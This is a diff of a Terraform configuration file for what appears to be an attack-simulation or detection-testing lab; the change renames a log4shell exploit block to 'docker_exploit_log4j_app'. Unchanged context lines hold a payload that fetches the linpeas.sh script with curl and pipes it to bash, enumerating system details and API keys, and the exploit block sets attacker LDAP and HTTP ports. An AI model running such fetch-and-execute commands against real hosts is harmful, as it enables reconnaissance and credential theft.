@@ -148,7 +148,7 @@ variable "config" {
                 payload                     = string
                 attack_delay                = number
               })
-              docker_exploit_log4shell = object({
+              docker_exploit_log4j_app = object({
                 enabled                     = bool
                 attacker_http_port          = number
                 attacker_ldap_port          = number
@@ -412,7 +412,7 @@ variable "config" {
                 payload                     = string
                 attack_delay                = number
               })
-              docker_exploit_log4shell = object({
+              docker_exploit_log4j_app = object({
                 enabled                     = bool
                 attacker_http_port          = number
                 attacker_ldap_port          = number
@@ -676,7 +676,7 @@ variable "config" {
                 payload                     = string
                 attack_delay                = number
               })
-              docker_exploit_log4shell = object({
+              docker_exploit_log4j_app = object({
                 enabled                     = bool
                 attacker_http_port          = number
                 attacker_ldap_port          = number
@@ -949,7 +949,7 @@ variable "config" {
                 payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
                 attack_delay                = 50400
               }
-              docker_exploit_log4shell = {
+              docker_exploit_log4j_app = {
                 enabled                     = false
                 attacker_http_port          = 8088
                 attacker_ldap_port          = 1389
@@ -1213,7 +1213,7 @@ variable "config" {
                 payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
                 attack_delay                = 50400
               }
-              docker_exploit_log4shell = {
+              docker_exploit_log4j_app = {
                 enabled                     = false
                 attacker_http_port          = 8088
                 attacker_ldap_port          = 1389
@@ -1477,7 +1477,7 @@ variable "config" {
                 payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
                 attack_delay                = 50400
               }
-              docker_exploit_log4shell = {
+              docker_exploit_log4j_app = {
                 enabled                     = false
                 attacker_http_port          = 8088
                 attacker_ldap_port          = 1389
